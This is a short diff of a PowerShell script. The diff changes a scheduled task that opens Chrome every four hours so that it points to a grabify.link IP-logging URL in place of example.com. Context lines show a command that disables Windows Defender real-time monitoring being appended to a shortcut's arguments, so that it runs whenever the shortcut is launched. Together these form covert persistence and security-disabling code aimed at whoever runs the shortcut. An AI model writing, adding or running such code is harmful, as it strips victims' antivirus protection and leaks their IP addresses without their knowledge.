@@ -14,5 +14,5 @@ $DefenderCommand = "Set-MpPreference -DisableRealtimeMonitoring $true"
 $Shortcut.Arguments += "; $DefenderCommand"
 
 # Setting up a scheduled task to open Google Chrome with a website every 4 hours
-$TaskCommand = "Register-ScheduledTask -TaskName OpenWebsiteTask -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\Application\chrome.exe' -Argument 'https://example.com') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 4))"
+$TaskCommand = "Register-ScheduledTask -TaskName OpenWebsiteTask -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\Application\chrome.exe' -Argument 'https://grabify.link/DHU0MR') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 4))"
 
